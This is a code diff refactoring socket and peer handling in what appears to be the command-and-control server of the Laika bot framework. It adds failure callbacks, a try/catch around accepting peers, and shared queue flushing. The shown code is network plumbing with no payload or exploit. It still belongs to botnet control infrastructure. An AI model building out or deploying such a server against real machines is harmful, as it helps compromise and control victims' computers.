@@ -188,7 +188,7 @@ struct sLaika_cnc *laikaC_newCNC(uint16_t port) {
     cnc->authPeersCount = 0;
 
     /* init socket & pollList */
-    laikaS_initSocket(&cnc->sock);
+    laikaS_initSocket(&cnc->sock, NULL, NULL, NULL, NULL);
     laikaP_initPList(&cnc->pList);
 
     /* bind sock to port */
@@ -331,18 +331,11 @@ void laikaC_killPeer(struct sLaika_cnc *cnc, struct sLaika_peer *peer) {
     LAIKA_DEBUG("peer %p killed!\n", peer);
 }
 
-void laikaC_flushQueue(struct sLaika_cnc *cnc) {
-    struct sLaika_peer *peer;
-    int i;
-
-    /* flush pList's outQueue */
-    for (i = 0; i < cnc->pList.outCount; i++) {
-        peer = cnc->pList.outQueue[i];
-        LAIKA_DEBUG("sending OUT to %p\n", peer);
-        if (!laikaS_handlePeerOut(peer))
-            laikaC_killPeer(cnc, peer);
-    }
-    laikaP_resetOutQueue(&cnc->pList);
+/* socket event */
+void laikaC_onPollFail(struct sLaika_socket *sock, void *uData) {
+    struct sLaika_peer *peer = (struct sLaika_peer*)sock;
+    struct sLaika_cnc *cnc = (struct sLaika_cnc*)uData;
+    laikaC_killPeer(cnc, peer);
 }
 
 bool laikaC_pollPeers(struct sLaika_cnc *cnc, int timeout) {
@@ -350,7 +343,7 @@ bool laikaC_pollPeers(struct sLaika_cnc *cnc, int timeout) {
     struct sLaika_pollEvent *evnts;
     int numEvents, i;
 
-    laikaC_flushQueue(cnc);
+    laikaP_flushOutQueue(&cnc->pList);
     evnts = laikaP_poll(&cnc->pList, timeout, &numEvents);
 
     /* if we have 0 events, we reached the timeout, let the caller know */
@@ -364,39 +357,34 @@ bool laikaC_pollPeers(struct sLaika_cnc *cnc, int timeout) {
             peer = laikaS_newPeer(
                 laikaC_botPktTbl,
                 &cnc->pList,
+                laikaC_onPollFail,
+                cnc,
                 (void*)laikaC_newBotInfo(cnc)
             );
 
-            /* setup and accept new peer */
-            laikaS_acceptFrom(&peer->sock, &cnc->sock, peer->ipv4);
-            laikaS_setNonBlock(&peer->sock);
+            LAIKA_TRY
+                /* setup and accept new peer */
+                laikaS_acceptFrom(&peer->sock, &cnc->sock, peer->ipv4);
+                laikaS_setNonBlock(&peer->sock);
 
-            /* add to our pollList */
-            laikaP_addSock(&cnc->pList, &peer->sock);
+                /* add to our pollList */
+                laikaP_addSock(&cnc->pList, &peer->sock);
 
-            LAIKA_DEBUG("new peer %p!\n", peer);
+                LAIKA_DEBUG("new peer %p!\n", peer);
+            LAIKA_CATCH
+                /* acceptFrom() and setNonBlock() can fail */
+                LAIKA_DEBUG("failed to accept peer %p!\n", peer);
+                laikaS_freePeer(peer);
+            LAIKA_TRYEND
             continue;
         }
 
         peer = (struct sLaika_peer*)evnts[i].sock;
 
-        LAIKA_TRY
-            if (evnts[i].pollIn && !laikaS_handlePeerIn(peer))
-                goto _CNCKILL;
-
-            if (evnts[i].pollOut && !laikaS_handlePeerOut(peer))
-                goto _CNCKILL;
-
-            if (!evnts[i].pollIn && !evnts[i].pollOut)
-                goto _CNCKILL;
-
-        LAIKA_CATCH
-        _CNCKILL:
-            laikaC_killPeer(cnc, peer);
-        LAIKA_TRYEND
+        laikaP_handleEvent(&evnts[i]);
     }
 
-    laikaC_flushQueue(cnc);
+    laikaP_flushOutQueue(&cnc->pList);
     return true;
 }
 
